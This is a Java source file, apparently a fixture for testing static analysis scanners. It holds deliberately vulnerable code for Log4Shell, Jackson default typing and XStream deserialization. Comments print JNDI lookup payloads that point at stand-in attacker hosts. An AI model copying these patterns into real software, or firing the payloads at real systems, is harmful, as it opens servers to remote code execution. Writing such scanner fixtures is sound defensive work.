package com.example.sastdemo;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.thoughtworks.xstream.XStream;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.InputStream;

/**
 * VulnerableDependencies.java — usage of dependency versions with known CVEs.
 *
 * Each method demonstrates a pattern that triggers or exposes a known
 * vulnerability in the pinned dependency version.
 *
 * CVEs covered:
 * CVE-2021-44228 Log4Shell — log4j-core 2.14.1
 * CVE-2019-14379 Jackson RCE — jackson-databind 2.9.8
 * CVE-2021-29505 XStream RCE — xstream 1.4.15
 */
public class VulnerableDependencies {

    // -----------------------------------------------------------------------
    // CVE-2021-44228 — Log4Shell (log4j-core 2.14.1)
    // CVSS: 10.0 CRITICAL
    //
    // Log4j performs JNDI lookups on log messages that contain ${...}.
    // Logging unsanitized user input allows an attacker to inject a string
    // such as "${jndi:ldap://attacker.com/a}" and achieve remote code execution.
    // -----------------------------------------------------------------------
    private static final Logger log = LogManager.getLogger(VulnerableDependencies.class);

    public void logUserInput(String userInput) {
        // SAST: logging unsanitized user input with Log4j 2.14.1 — Log4Shell
        // (CVE-2021-44228)
        // Attacker payload: "${jndi:ldap://evil.com/exploit}"
        log.info("User input received: {}", userInput);
        log.error("Login failed for user: " + userInput); // string concat variant also vulnerable
    }

    // -----------------------------------------------------------------------
    // CVE-2019-14379 — Jackson Databind unsafe deserialization
    // CVSS: 9.8 CRITICAL
    //
    // jackson-databind 2.9.8 contains unsafe deserialization gadget chains.
    // enableDefaultTyping() allows polymorphic type handling that an attacker
    // can exploit to execute arbitrary code by sending a crafted JSON payload.
    // -----------------------------------------------------------------------
    public Object deserializeJson(String json) throws Exception {
        ObjectMapper mapper = new ObjectMapper();
        // SAST: enableDefaultTyping() with untrusted input — RCE (CVE-2019-14379)
        mapper.enableDefaultTyping();
        return mapper.readValue(json, Object.class);
    }

    // -----------------------------------------------------------------------
    // CVE-2021-29505 — XStream unsafe deserialization
    // CVSS: 8.8 HIGH
    //
    // XStream 1.4.15 allows arbitrary code execution when deserializing
    // attacker-controlled XML. The security framework must be explicitly
    // configured; by default no type denylist is applied.
    // -----------------------------------------------------------------------
    public Object deserializeXml(String xml) {
        XStream xstream = new XStream();
        // SAST: XStream.fromXML() without security restrictions — RCE (CVE-2021-29505)
        // Fix: XStream.setupDefaultSecurity(xstream) and whitelist allowed types
        return xstream.fromXML(xml);
    }

    public Object deserializeXmlStream(InputStream xmlStream) {
        XStream xstream = new XStream();
        // SAST: XStream.fromXML(InputStream) without security framework — RCE
        return xstream.fromXML(xmlStream);
    }
}
